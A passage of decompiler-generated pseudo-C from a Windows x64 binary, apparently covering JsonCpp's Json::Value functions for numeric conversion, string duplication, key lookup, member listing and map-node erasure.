  int v6; // ecx
  _QWORD *v7; // rax
  double result; // rax
  double v9; // xmm1_8
  signed __int64 v10; // rcx
  _QWORD *v11; // rax
  _QWORD *v12; // rax
  int v13; // [rsp+2Ch] [rbp-D4h]
  signed int *v14; // [rsp+30h] [rbp-D0h]
  char v15; // [rsp+38h] [rbp-C8h]
  void *v16; // [rsp+B8h] [rbp-48h]
  __int64 v17; // [rsp+120h] [rbp+20h]
  char v18; // [rsp+128h] [rbp+28h]
  char v19; // [rsp+148h] [rbp+48h]

  v17 = -2i64;
  v1 = a1;
  v2 = 0.0;
  v3 = *(char *)(a1 + 8);
  if ( !v3 )
    return 0.0;
  v4 = v3 - 1;
  if ( !v4 )
    goto LABEL_15;
  v5 = v4 - 1;
  if ( !v5 )
    return *(double *)v1;
  v6 = v5 - 1;
  if ( v6 )
  {
    if ( v6 != 2 )
    {
      v14 = (signed int *)&unk_1400AE528;
      std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v16);
      std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(
        &v14,
        &v15,
        0i64,
        0i64);
      *(signed int **)((char *)&v14 + v14[1]) = (signed int *)&off_1400AE520;
      *(int *)((char *)&v13 + v14[1]) = v14[1] - 136;
      sub_140022FE0((__int64)&v15, 2);
      sub_14006AC80(&v14, "Value is not convertible to UInt64.");
      v7 = sub_14006F1C0((__int64)&v14, &v18);
      sub_14006F240(v7);
    }
    LOBYTE(v2) = *(_BYTE *)v1 != LOBYTE(v2);
    return v2;
  }
  v9 = *(double *)v1;
  if ( *(double *)v1 < 0.0 || (double)-1 + 1.844674407370955e19 < v9 )
  {
    v14 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v16);
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v14, &v15, 0i64, 0i64);
    *(signed int **)((char *)&v14 + v14[1]) = (signed int *)&off_1400AE520;
    *(int *)((char *)&v13 + v14[1]) = v14[1] - 136;
    sub_140022FE0((__int64)&v15, 2);
    sub_14006AC80(&v14, "double out of UInt64 range");
    v11 = sub_14006F1C0((__int64)&v14, &v18);
    sub_14006F240(v11);
LABEL_15:
    if ( !sub_14006E920(v1) )
    {
      v14 = (signed int *)&unk_1400AE528;
      v16 = std::basic_ios<char,std::char_traits<char>>::`vftable';
      std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(
        &v14,
        &v15,
        0i64,
        0i64);
      *(signed int **)((char *)&v14 + v14[1]) = (signed int *)&off_1400AE520;
      *(int *)((char *)&v13 + v14[1]) = v14[1] - 136;
      sub_140022FE0((__int64)&v15, 2);
      sub_14006AC80(&v14, "LargestInt out of UInt64 range");
      v12 = sub_14006F1C0((__int64)&v14, &v19);
      sub_14006F240(v12);
    }
    return *(double *)v1;
  }
  v10 = 0i64;
  if ( v9 >= 9.223372036854776e18 )
  {
    v9 = v9 - 9.223372036854776e18;
    if ( v9 < 9.223372036854776e18 )
      v10 = 0x8000000000000000i64;
  }
  *(_QWORD *)&result = v10 + (unsigned int)(signed int)v9;
  return result;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006D7B0) ----------------------------------------------------
double __usercall sub_14006D7B0@<rax>(double *a1@<rcx>)
{
  double *v1; // rbx
  unsigned int v2; // edx
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  _QWORD *v7; // rax
  double result; // rax
  double v9; // xmm1_8
  _QWORD *v10; // rax
  _QWORD *v11; // rax
  _QWORD *v12; // rax
  int v13; // [rsp+2Ch] [rbp-D4h]
  signed int *v14; // [rsp+30h] [rbp-D0h]
  char v15; // [rsp+38h] [rbp-C8h]
  char v16; // [rsp+B8h] [rbp-48h]
  __int64 v17; // [rsp+120h] [rbp+20h]
  char v18; // [rsp+128h] [rbp+28h]
  char v19; // [rsp+148h] [rbp+48h]
  char v20; // [rsp+168h] [rbp+68h]

  v17 = -2i64;
  v1 = a1;
  v2 = 0;
  v3 = *((char *)a1 + 8);
  if ( !v3 )
    return 0.0;
  v4 = v3 - 1;
  if ( !v4 )
    goto LABEL_14;
  v5 = v4 - 1;
  if ( !v5 )
  {
LABEL_12:
    if ( sub_14006E9A0((__int64)v1) )
    {
LABEL_16:
      *(_QWORD *)&result = *(unsigned int *)v1;
      return result;
    }
    v14 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v16);
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v14, &v15, 0i64, 0i64);
    *(signed int **)((char *)&v14 + v14[1]) = (signed int *)&off_1400AE520;
    *(int *)((char *)&v13 + v14[1]) = v14[1] - 136;
    sub_140022FE0((__int64)&v15, 2);
    sub_14006AC80(&v14, "LargestUInt out of UInt range");
    v11 = sub_14006F1C0((__int64)&v14, &v20);
    sub_14006F240(v11);
LABEL_14:
    if ( !sub_14006E9A0((__int64)v1) )
    {
      v14 = (signed int *)&unk_1400AE528;
      std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v16);
      std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(
        &v14,
        &v15,
        0i64,
        0i64);
      *(signed int **)((char *)&v14 + v14[1]) = (signed int *)&off_1400AE520;
      *(int *)((char *)&v13 + v14[1]) = v14[1] - 136;
      sub_140022FE0((__int64)&v15, 2);
      sub_14006AC80(&v14, "LargestInt out of UInt range");
      v12 = sub_14006F1C0((__int64)&v14, &v19);
      sub_14006F240(v12);
    }
    goto LABEL_16;
  }
  v6 = v5 - 1;
  if ( !v6 )
  {
    v9 = *v1;
    if ( *v1 >= 0.0 && v9 <= 4294967295.0 )
    {
      *(_QWORD *)&result = (unsigned int)(signed int)v9;
      return result;
    }
    v14 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v16);
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v14, &v15, 0i64, 0i64);
    *(signed int **)((char *)&v14 + v14[1]) = (signed int *)&off_1400AE520;
    *(int *)((char *)&v13 + v14[1]) = v14[1] - 136;
    sub_140022FE0((__int64)&v15, 2);
    sub_14006AC80(&v14, "double out of UInt range");
    v10 = sub_14006F1C0((__int64)&v14, &v18);
    sub_14006F240(v10);
    goto LABEL_12;
  }
  if ( v6 != 2 )
  {
    v14 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v16);
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v14, &v15, 0i64, 0i64);
    *(signed int **)((char *)&v14 + v14[1]) = (signed int *)&off_1400AE520;
    *(int *)((char *)&v13 + v14[1]) = v14[1] - 136;
    sub_140022FE0((__int64)&v15, 2);
    sub_14006AC80(&v14, "Value is not convertible to UInt.");
    v7 = sub_14006F1C0((__int64)&v14, &v18);
    sub_14006F240(v7);
  }
  LOBYTE(v2) = *(_BYTE *)v1 != (_BYTE)v2;
  *(_QWORD *)&result = v2;
  return result;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006DAF0) ----------------------------------------------------
_DWORD *__fastcall sub_14006DAF0(void *Src, size_t Size)
{
  size_t v2; // rdi
  void *v3; // rbp
  _QWORD *v4; // rax
  _DWORD *v5; // rax
  _DWORD *v6; // rbx
  __int64 v8; // [rsp+28h] [rbp-140h]
  signed int *v9; // [rsp+30h] [rbp-138h]
  char v10; // [rsp+38h] [rbp-130h]
  void *v11; // [rsp+B8h] [rbp-B0h]
  char Dst; // [rsp+120h] [rbp-48h]
  __int64 v13; // [rsp+130h] [rbp-38h]
  __int64 v14; // [rsp+138h] [rbp-30h]

  v8 = -2i64;
  v2 = (unsigned int)Size;
  v3 = Src;
  if ( (unsigned int)Size > 0x7FFFFFFA )
  {
    v9 = (signed int *)&unk_1400AE528;
    v11 = std::basic_ios<char,std::char_traits<char>>::`vftable';
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v9, &v10, 0i64, 0i64);
    *(signed int **)((char *)&v9 + v9[1]) = (signed int *)&off_1400AE520;
    *(_DWORD *)((char *)&v8 + v9[1] + 4) = v9[1] - 136;
    sub_140022FE0((__int64)&v10, 2);
    sub_14006AC80(&v9, "in Json::Value::duplicateAndPrefixStringValue(): length too big for prefixing");
    v4 = sub_14006F1C0((__int64)&v9, &Dst);
    sub_14006F240(v4);
  }
  v5 = malloc((unsigned int)(v2 + 5));
  v6 = v5;
  if ( !v5 )
  {
    v14 = 15i64;
    v13 = 0i64;
    Dst = 0;
    sub_140004F20(
      &Dst,
      "in Json::Value::duplicateAndPrefixStringValue(): Failed to allocate string value buffer",
      0x57ui64);
    sub_14006F2C0(&Dst);
  }
  *v5 = v2;
  memcpy(v5 + 1, v3, v2);
  *((_BYTE *)v6 + (unsigned int)(v2 + 4)) = 0;
  return v6;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006DC70) ----------------------------------------------------
_BYTE *__fastcall sub_14006DC70(void *Src, unsigned __int64 a2)
{
  size_t v2; // rbx
  void *v3; // rsi
  _BYTE *v4; // rax
  _BYTE *v5; // rdi
  char Dst; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  __int64 v9; // [rsp+40h] [rbp-18h]

  v2 = a2;
  v3 = Src;
  if ( a2 >= 0x7FFFFFFF )
    v2 = 2147483646i64;
  v4 = malloc(v2 + 1);
  v5 = v4;
  if ( !v4 )
  {
    v9 = 15i64;
    v8 = 0i64;
    Dst = 0;
    sub_140004F20(&Dst, "in Json::Value::duplicateStringValue(): Failed to allocate string value buffer", 0x4Eui64);
    sub_14006F2C0(&Dst);
  }
  memcpy(v4, v3, v2);
  v5[v2] = 0;
  return v5;
}

//----- (000000014006DD30) ----------------------------------------------------
__int64 *__fastcall sub_14006DD30(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 *v4; // rdi
  __int64 *v5; // rdx
  __int64 **v6; // rbx
  __int64 *v7; // rax
  __int64 v8; // rcx
  __int64 *result; // rax
  __int64 *v10; // rax
  __int64 v11; // rdx
  __int64 j; // rcx
  __int64 i; // rcx
  char v14; // [rsp+30h] [rbp+8h]
  __int64 v15; // [rsp+40h] [rbp+18h]
  __int64 v16; // [rsp+48h] [rbp+20h]

  v16 = a4;
  v15 = a3;
  v4 = a2;
  v5 = *a1;
  v6 = a1;
  if ( a3 != **a1 || (__int64 *)a4 != v5 )
  {
    if ( a3 != a4 )
    {
      do
      {
        v10 = (__int64 *)a3;
        if ( !*(_BYTE *)(a3 + 25) )
        {
          v11 = *(_QWORD *)(a3 + 16);
          if ( *(_BYTE *)(v11 + 25) )
          {
            for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
            {
              if ( a3 != *(_QWORD *)(i + 16) )
                break;
              v15 = i;
              a3 = i;
            }
            v15 = i;
          }
          else
          {
            for ( j = *(_QWORD *)v11; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
              v11 = j;
            v15 = v11;
          }
        }
        sub_14006DE30(v6, &v14, v10);
        a3 = v15;
      }
      while ( v15 != v16 );
    }
    *v4 = a3;
    result = v4;
  }
  else
  {
    sub_14006CAD0((__int64)a1, (__int64 *)v5[1]);
    (*v6)[1] = (__int64)*v6;
    **v6 = (__int64)*v6;
    (*v6)[2] = (__int64)*v6;
    v7 = *v6;
    v6[1] = 0i64;
    v8 = *v7;
    result = v4;
    *v4 = v8;
  }
  return result;
}

//----- (000000014006DE30) ----------------------------------------------------
_QWORD *__fastcall sub_14006DE30(_QWORD *a1, _QWORD *a2, __int64 *a3)
{
  _QWORD *v3; // r15
  _QWORD *v4; // r14
  __int64 *v5; // rsi
  __int64 v6; // rax
  __int64 j; // rax
  __int64 i; // rax
  __int64 v9; // rdi
  __int64 *v10; // rbx
  __int64 v11; // rcx
  __int64 k; // rax
  __int64 v13; // rcx
  __int64 l; // rax
  __int64 **v15; // rax
  char v16; // cl
  _BYTE *v17; // rcx
  __int64 **v18; // rcx
  __int64 **v19; // rax
  __int64 v20; // rcx
  __int64 v21; // rax
  __int64 *v22; // rax
  void *v23; // rcx
  __int64 v24; // rax
  __int64 *v26; // [rsp+60h] [rbp+18h]

  v26 = a3;
  v3 = a2;
  v4 = a1;
  v5 = a3;
  if ( !*((_BYTE *)a3 + 25) )
  {
    v6 = a3[2];
    if ( *(_BYTE *)(v6 + 25) )
    {
      for ( i = a3[1]; !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( a3 != *(__int64 **)(i + 16) )
          break;
        a3 = (__int64 *)i;
      }
      a3 = (__int64 *)i;
      v26 = (__int64 *)i;
    }
    else
    {
      a3 = (__int64 *)a3[2];
      for ( j = *(_QWORD *)v6; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
        a3 = (__int64 *)j;
      v26 = a3;
    }
  }
  if ( *(_BYTE *)(*v5 + 25) )
  {
    v9 = v5[2];
LABEL_15:
    v10 = (__int64 *)v5[1];
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    if ( *(__int64 **)(*a1 + 8i64) == v5 )
    {
      *(_QWORD *)(*a1 + 8i64) = v9;
    }
    else if ( (__int64 *)*v10 == v5 )
    {
      *v10 = v9;
    }
    else
    {
      v10[2] = v9;
    }
    if ( *(__int64 **)*a1 == v5 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        v11 = (__int64)v10;
      }
      else
      {
        v11 = v9;
        for ( k = *(_QWORD *)v9; !*(_BYTE *)(k + 25); k = *(_QWORD *)k )
          v11 = k;
      }
      *(_QWORD *)*v4 = v11;
    }
    if ( *(__int64 **)(*v4 + 16i64) == v5 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        v13 = (__int64)v10;
      }
      else
      {
        v13 = v9;
        for ( l = *(_QWORD *)(v9 + 16); !*(_BYTE *)(l + 25); l = *(_QWORD *)(l + 16) )
          v13 = l;
      }
      *(_QWORD *)(*v4 + 16i64) = v13;
    }
    goto LABEL_45;
  }
  if ( *(_BYTE *)(v5[2] + 25) )
  {
    v9 = *v5;
    goto LABEL_15;
  }
  v9 = a3[2];
  if ( a3 == v5 )
    goto LABEL_15;
  *(_QWORD *)(*v5 + 8) = a3;
  *a3 = *v5;
  if ( a3 == (__int64 *)v5[2] )
  {
    v10 = a3;
  }
  else
  {
    v10 = (__int64 *)a3[1];
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    *v10 = v9;
    a3[2] = v5[2];
    *(_QWORD *)(v5[2] + 8) = a3;
  }
  if ( *(__int64 **)(*a1 + 8i64) == v5 )
  {
    *(_QWORD *)(*a1 + 8i64) = a3;
  }
  else
  {
    v15 = (__int64 **)v5[1];
    if ( *v15 == v5 )
      *v15 = a3;
    else
      v15[2] = a3;
  }
  a3[1] = v5[1];
  v16 = *((_BYTE *)a3 + 24);
  *((_BYTE *)a3 + 24) = *((_BYTE *)v5 + 24);
  *((_BYTE *)v5 + 24) = v16;
LABEL_45:
  if ( *((_BYTE *)v5 + 24) == 1 )
  {
    while ( 1 )
    {
      if ( v9 == *(_QWORD *)(*v4 + 8i64) || *(_BYTE *)(v9 + 24) != 1 )
      {
LABEL_82:
        *(_BYTE *)(v9 + 24) = 1;
        break;
      }
      v17 = (_BYTE *)*v10;
      if ( v9 == *v10 )
      {
        v17 = (_BYTE *)v10[2];
        if ( !v17[24] )
        {
          v17[24] = 1;
          *((_BYTE *)v10 + 24) = 0;
          v18 = (__int64 **)v10[2];
          v10[2] = (__int64)*v18;
          if ( !*((_BYTE *)*v18 + 25) )
            (*v18)[1] = (__int64)v10;
          v18[1] = (__int64 *)v10[1];
          if ( v10 == *(__int64 **)(*v4 + 8i64) )
          {
            *(_QWORD *)(*v4 + 8i64) = v18;
          }
          else
          {
            v19 = (__int64 **)v10[1];
            if ( v10 == *v19 )
              *v19 = (__int64 *)v18;
            else
              v19[2] = (__int64 *)v18;
          }
          *v18 = v10;
          v10[1] = (__int64)v18;
          v17 = (_BYTE *)v10[2];
        }
        if ( !v17[25] )
        {
          if ( *(_BYTE *)(*(_QWORD *)v17 + 24i64) != 1 || *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) != 1 )
          {
            if ( *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) == 1 )
            {
              *(_BYTE *)(*(_QWORD *)v17 + 24i64) = 1;
              v17[24] = 0;
              sub_14000C800((__int64)v4, v17);
              v17 = (_BYTE *)v10[2];
            }
            v17[24] = *((_BYTE *)v10 + 24);
            *((_BYTE *)v10 + 24) = 1;
            *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) = 1;
            sub_14001BF70((__int64)v4, (__int64)v10);
            goto LABEL_82;
          }
LABEL_74:
          v17[24] = 0;
          goto LABEL_75;
        }
      }
      else
      {
        if ( !v17[24] )
        {
          v17[24] = 1;
          *((_BYTE *)v10 + 24) = 0;
          v20 = *v10;
          *v10 = *(_QWORD *)(*v10 + 16);
          v21 = *(_QWORD *)(v20 + 16);
          if ( !*(_BYTE *)(v21 + 25) )
            *(_QWORD *)(v21 + 8) = v10;
          *(_QWORD *)(v20 + 8) = v10[1];
          if ( v10 == *(__int64 **)(*v4 + 8i64) )
          {
            *(_QWORD *)(*v4 + 8i64) = v20;
          }
          else
          {
            v22 = (__int64 *)v10[1];
            if ( v10 == (__int64 *)v22[2] )
              v22[2] = v20;
            else
              *v22 = v20;
          }
          *(_QWORD *)(v20 + 16) = v10;
          v10[1] = v20;
          v17 = (_BYTE *)*v10;
        }
        if ( !v17[25] )
        {
          if ( *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) != 1 || *(_BYTE *)(*(_QWORD *)v17 + 24i64) != 1 )
          {
            if ( *(_BYTE *)(*(_QWORD *)v17 + 24i64) == 1 )
            {
              *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) = 1;
              v17[24] = 0;
              sub_14001BF70((__int64)v4, (__int64)v17);
              v17 = (_BYTE *)*v10;
            }
            v17[24] = *((_BYTE *)v10 + 24);
            *((_BYTE *)v10 + 24) = 1;
            *(_BYTE *)(*(_QWORD *)v17 + 24i64) = 1;
            sub_14000C800((__int64)v4, v10);
            goto LABEL_82;
          }
          goto LABEL_74;
        }
      }
LABEL_75:
      v9 = (__int64)v10;
      v10 = (__int64 *)v10[1];
    }
  }
  sub_14006BF10((__int64)(v5 + 6));
  v23 = (void *)v5[4];
  if ( v23 && (v5[5] & 3) == 1 )
    free(v23);
  operator delete(v5);
  v24 = v4[1];
  if ( v24 )
    v4[1] = v24 - 1;
  *v3 = v26;
  return v3;
}

//----- (000000014006E230) ----------------------------------------------------
__int64 __fastcall sub_14006E230(__int64 a1, void *a2, int a3)
{
  int v3; // esi
  void *v4; // r12
  char v5; // al
  _QWORD *v6; // rax
  unsigned int v7; // esi
  __int64 v8; // r15
  __int64 v9; // rbx
  __int64 v10; // rdi
  __int64 v11; // r13
  const void *v12; // rcx
  bool v13; // cf
  unsigned int v14; // er14
  int *v15; // rax
  int v16; // eax
  bool v17; // cf
  unsigned int v18; // er14
  int *v19; // rax
  int v20; // eax
  __int64 v22; // rbx
  unsigned int v23; // [rsp+20h] [rbp-E0h]
  unsigned int v24; // [rsp+24h] [rbp-DCh]
  __int64 v25; // [rsp+28h] [rbp-D8h]
  __int64 v26; // [rsp+30h] [rbp-D0h]
  int v27; // [rsp+3Ch] [rbp-C4h]
  signed int *v28; // [rsp+40h] [rbp-C0h]
  char v29; // [rsp+48h] [rbp-B8h]
  void *v30; // [rsp+C8h] [rbp-38h]
  char v31; // [rsp+130h] [rbp+30h]

  v26 = -2i64;
  v3 = a3;
  v4 = a2;
  v23 = 0;
  v5 = *(_BYTE *)(a1 + 8);
  if ( !v5 )
    return 0i64;
  if ( v5 != 7 )
  {
    v28 = (signed int *)&unk_1400AE528;
    v30 = std::basic_ios<char,std::char_traits<char>>::`vftable';
    v23 = 1;
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v28, &v29, 0i64, 0i64);
    *(signed int **)((char *)&v28 + v28[1]) = (signed int *)&off_1400AE520;
    *(int *)((char *)&v27 + v28[1]) = v28[1] - 136;
    sub_140022FE0((__int64)&v29, 2);
    sub_14006AC80(&v28, "in Json::Value::find(key, end, found): requires objectValue or nullValue");
    v6 = sub_14006F1C0((__int64)&v28, &v31);
    sub_14006F240(v6);
  }
  if ( !v5 )
    return 0i64;
  v7 = 4 * (v3 - (_DWORD)a2) & 0xFFFFFFFC;
  v8 = *(_QWORD *)a1;
  v25 = v8;
  v9 = *(_QWORD *)v8;
  v10 = *(_QWORD *)(*(_QWORD *)v8 + 8i64);
  v11 = *(_QWORD *)v8;
  if ( *(_BYTE *)(v10 + 25) )
    goto LABEL_18;
  do
  {
    v12 = *(const void **)(v10 + 32);
    if ( v12 )
    {
      v14 = *(_DWORD *)(v10 + 40) >> 2;
      v24 = v14;
      v23 = v7 >> 2;
      v15 = (int *)&v23;
      if ( v7 >> 2 >= v14 )
        v15 = (int *)&v24;
      v16 = memcmp(v12, v4, (unsigned int)*v15);
      if ( v16 < 0 )
        goto LABEL_15;
      if ( v16 > 0 )
        goto LABEL_14;
      v13 = v14 < v7 >> 2;
    }
    else
    {
      v13 = *(_DWORD *)(v10 + 40) < v7;
    }
    if ( !v13 )
    {
LABEL_14:
      v11 = v10;
      v10 = *(_QWORD *)v10;
      continue;
    }
LABEL_15:
    v10 = *(_QWORD *)(v10 + 16);
  }
  while ( !*(_BYTE *)(v10 + 25) );
  v8 = v25;
LABEL_18:
  if ( v11 == v9 )
    goto LABEL_40;
  if ( !v4 )
  {
    v17 = v7 < *(_DWORD *)(v11 + 40);
    goto LABEL_26;
  }
  v23 = v7 >> 2;
  v18 = *(_DWORD *)(v11 + 40) >> 2;
  v24 = v18;
  v19 = (int *)&v24;
  if ( v18 >= v7 >> 2 )
    v19 = (int *)&v23;
  v20 = memcmp(v4, *(const void **)(v11 + 32), (unsigned int)*v19);
  if ( v20 < 0 )
    goto LABEL_40;
  if ( v20 > 0 )
    goto LABEL_41;
  v17 = v7 >> 2 < v18;
LABEL_26:
  if ( v17 )
LABEL_40:
    v25 = v9;
  else
LABEL_41:
    v25 = v11;
  if ( v25 == *(_QWORD *)v8 )
  {
    if ( v4 )
    {
      if ( (v7 & 3) == 1 )
        free(v4);
    }
    return 0i64;
  }
  v22 = v25 + 48;
  if ( v4 && (v7 & 3) == 1 )
    free(v4);
  return v22;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006E4A0) ----------------------------------------------------
__int64 __fastcall sub_14006E4A0(__int64 a1, __int64 a2, _QWORD *a3)
{
  unsigned __int64 v3; // r10
  __int64 v4; // rbx
  __int64 v5; // rdi
  _QWORD *v6; // rax
  __int64 v7; // rcx

  v3 = a3[3];
  v4 = a2;
  v5 = a1;
  if ( v3 < 0x10 )
    LODWORD(v6) = (_DWORD)a3;
  else
    v6 = (_QWORD *)*a3;
  v7 = a3[2];
  if ( v3 >= 0x10 )
    a3 = (_QWORD *)*a3;
  sub_14006E500(v5, a2, a3, (_DWORD)v6 + v7);
  return v4;
}

//----- (000000014006E500) ----------------------------------------------------
__int64 __fastcall sub_14006E500(__int64 a1, __int64 a2, void *a3, int a4)
{
  __int64 v4; // rbx

  v4 = a2;
  sub_14006E230(a1, a3, a4);
  sub_14006BAD0(v4);
  return v4;
}
// 14006BAD0: using guessed type __int64 __fastcall sub_14006BAD0(_QWORD);

//----- (000000014006E540) ----------------------------------------------------
__int64 __fastcall sub_14006E540(__int64 a1, __int64 a2, _BYTE *a3)
{
  __int64 v3; // rbx
  signed __int64 v4; // r9

  v3 = a2;
  v4 = -1i64;
  do
    ++v4;
  while ( a3[v4] );
  sub_14006E500(a1, a2, a3, (_DWORD)a3 + v4);
  return v3;
}

//----- (000000014006E580) ----------------------------------------------------
_QWORD *__fastcall sub_14006E580(__int64 ****a1, _QWORD *a2)
{
  _QWORD *v2; // rsi
  __int64 ****v3; // rdi
  char v4; // al
  _QWORD *v5; // rax
  unsigned __int64 v6; // rdx
  __int64 ***v7; // rdi
  __int64 *v8; // rbx
  __int64 **v9; // rdi
  size_t v10; // r8
  __int64 **v11; // rax
  __int64 *j; // rax
  __int64 *i; // rax
  __int128 v15; // [rsp+28h] [rbp-D8h]
  __int64 v16; // [rsp+38h] [rbp-C8h]
  __int64 v17; // [rsp+40h] [rbp-C0h]
  int v18; // [rsp+4Ch] [rbp-B4h]
  signed int *v19; // [rsp+50h] [rbp-B0h]
  char v20; // [rsp+58h] [rbp-A8h]
  char v21; // [rsp+D8h] [rbp-28h]
  void *Dst; // [rsp+140h] [rbp+40h]
  __int64 v23; // [rsp+150h] [rbp+50h]
  unsigned __int64 v24; // [rsp+158h] [rbp+58h]

  v17 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = *((_BYTE *)a1 + 8);
  if ( !v4 )
    goto LABEL_27;
  if ( v4 != 7 )
  {
    v19 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v21);
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v19, &v20, 0i64, 0i64);
    *(signed int **)((char *)&v19 + v19[1]) = (signed int *)&off_1400AE520;
    *(int *)((char *)&v18 + v19[1]) = v19[1] - 136;
    sub_140022FE0((__int64)&v20, 2);
    sub_14006AC80(&v19, "in Json::Value::getMemberNames(), value must be objectValue");
    v5 = sub_14006F1C0((__int64)&v19, &Dst);
    sub_14006F240(v5);
  }
  if ( v4 )
  {
    _mm_storeu_si128((__m128i *)&v15, (__m128i)0i64);
    v16 = 0i64;
    v6 = (unsigned __int64)(*a1)[1];
    if ( v6 )
    {
      if ( v6 > 0x7FFFFFFFFFFFFFFi64 )
      {
        std::_Xlength_error("vector<T> too long");
        __debugbreak();
      }
      sub_14006CB60((void **)&v15, v6);
    }
    v7 = *v3;
    v8 = **v7;
    v9 = *v7;
    while ( v8 != (__int64 *)v9 )
    {
      v10 = (unsigned int)(*((_DWORD *)v8 + 10) >> 2);
      v24 = 15i64;
      v23 = 0i64;
      LOBYTE(Dst) = 0;
      sub_140004F20(&Dst, (void *)v8[4], v10);
      sub_14006EA40(&v15, &Dst);
      if ( v24 >= 0x10 )
        operator delete(Dst);
      if ( !*((_BYTE *)v8 + 25) )
      {
        v11 = (__int64 **)v8[2];
        if ( *((_BYTE *)v11 + 25) )
        {
          for ( i = (__int64 *)v8[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
          {
            if ( v8 != (__int64 *)i[2] )
              break;
            v8 = i;
          }
          v8 = i;
        }
        else
        {
          v8 = (__int64 *)v8[2];
          for ( j = *v11; !*((_BYTE *)j + 25); j = (__int64 *)*j )
            v8 = j;
        }
      }
    }
    *(_OWORD *)v2 = v15;
    v2[2] = v16;
  }
  else
  {
LABEL_27:
    *a2 = 0i64;
    a2[1] = 0i64;
    a2[2] = 0i64;
  }
  return v2;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006E7C0) ----------------------------------------------------
char __fastcall sub_14006E7C0(__int64 a1, unsigned int **a2, _QWORD *a3)
{
  unsigned int **v3; // r9
  char result; // al
  unsigned int *v5; // rdx
  signed __int64 v6; // rcx
  unsigned int v7; // ecx

  v3 = a2;
  if ( *(_BYTE *)(a1 + 8) != 4 )
    return 0;
  v5 = *(unsigned int **)a1;
  if ( !*(_QWORD *)a1 )
    return 0;
  if ( (*(_WORD *)(a1 + 8) >> 8) & 1 )
  {
    v7 = *v5;
    *v3 = v5 + 1;
    *a3 = (char *)*v3 + v7;
    result = 1;
  }
  else
  {
    v6 = -1i64;
    do
      ++v6;
    while ( *((_BYTE *)v5 + v6) );
    *v3 = v5;
    *a3 = (char *)v5 + (unsigned int)v6;
    result = 1;
  }
  return result;
}

//----- (000000014006E810) ----------------------------------------------------
bool __fastcall sub_14006E810(__int64 a1)
{
  return *(_BYTE *)(a1 + 8) == 6;
}

//----- (000000014006E820) ----------------------------------------------------
char __fastcall sub_14006E820(__int64 a1)
{
